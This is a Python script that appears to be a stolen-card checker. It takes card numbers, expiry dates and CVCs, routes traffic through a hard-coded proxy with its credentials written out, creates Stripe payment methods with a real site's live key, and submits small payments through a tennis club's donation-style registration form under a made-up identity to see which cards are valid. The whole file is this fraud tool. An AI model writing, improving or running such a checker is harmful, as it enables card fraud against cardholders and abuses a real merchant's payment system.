import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	import requests
	username = "6Cisp4WmVM"
	password = "RGhzCYWVWs"
	proxy = "216.107.136.204:49466"
	proxy_auth = "{}:{}@{}".format(username, password, proxy)
	proxies = {
			"http":"http://{}".format(proxy_auth)
	}
	urlToGet = "http://api.ipify.org/"
	r = requests.get(urlToGet , proxies=proxies)
	print("IP Address: {}".format(r.text))

	import requests
	username = "6Cisp4WmVM"
	password = "RGhzCYWVWs"
	proxy = "216.107.136.204:49466"
	proxy_auth = "{}:{}@{}".format(username, password, proxy)
	proxies = {
			"http":"http://{}".format(proxy_auth)
	}
	urlToGet = "http://api.ipify.org/"
	r = requests.get(urlToGet , proxies=proxies)

	headers = {
			'authority': 'api.stripe.com',
			'accept': 'application/json',
			'accept-language': 'en-US,en;q=0.9',
			'content-type': 'application/x-www-form-urlencoded',
			'origin': 'https://js.stripe.com',
			'referer': 'https://js.stripe.com/',
			'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-site',
			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=7399b302-2138-4af2-ace0-1e1ad1d628f72141ad&muid=1c4e5e49-0069-408d-baf4-cdaf3614e618ddbd29&sid=a5344258-78f3-4ff4-9330-d7b6617c9089b5f51a&pasted_fields=number&payment_user_agent=stripe.js%2F3f03dac031%3B+stripe-js-v3%2F3f03dac031%3B+card-element&referrer=https%3A%2F%2Ftorontobeachtennis.ca&time_on_page=93469&key=pk_live_51KlyKZHjaBg7WuKvBzW0sNRuOyOklU8A1jIC5n4kfCjrWhZdNe8a4Edo07hoKaKrnhzgTsdxu24weExpBH6KGtkD005j7XZ2iL'
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']

	import requests
	username = "6Cisp4WmVM"
	password = "RGhzCYWVWs"
	proxy = "216.107.136.204:49466"
	proxy_auth = "{}:{}@{}".format(username, password, proxy)
	proxies = {
	    "http":"http://{}".format(proxy_auth)
	}
	urlToGet = "http://api.ipify.org/"
	r = requests.get(urlToGet , proxies=proxies)

	cookies = {
		'__stripe_mid': '1c4e5e49-0069-408d-baf4-cdaf3614e618ddbd29',
    '__stripe_sid': 'a5344258-78f3-4ff4-9330-d7b6617c9089b5f51a',
	}

	headers = {
	'authority': 'torontobeachtennis.ca',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '__stripe_mid=1c4e5e49-0069-408d-baf4-cdaf3614e618ddbd29; __stripe_sid=a5344258-78f3-4ff4-9330-d7b6617c9089b5f51a',
    'origin': 'https://torontobeachtennis.ca',
    'referer': 'https://torontobeachtennis.ca/2024-easy-breezy/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
	}

	params = {
			't': '1728930960635',
	}

	data = {
			'data': '__fluent_form_embded_post_id=3358&_fluentform_20_fluentformnonce=babdbe618b&_wp_http_referer=%2F2024-easy-breezy%2F&names%5Bfirst_name%5D=Mas&names%5Blast_name%5D=Walker&phone=1843735431&email=maswalkerus01%40gmail.com&payment_input=Member%20-%20%245&dropdown_1=Beginner&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
    'action': 'fluentform_submit',
    'form_id': '20',
	}
	
	r2 = requests.post(
			'https://torontobeachtennis.ca/wp-admin/admin-ajax.php',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
	)
	return (r2.json())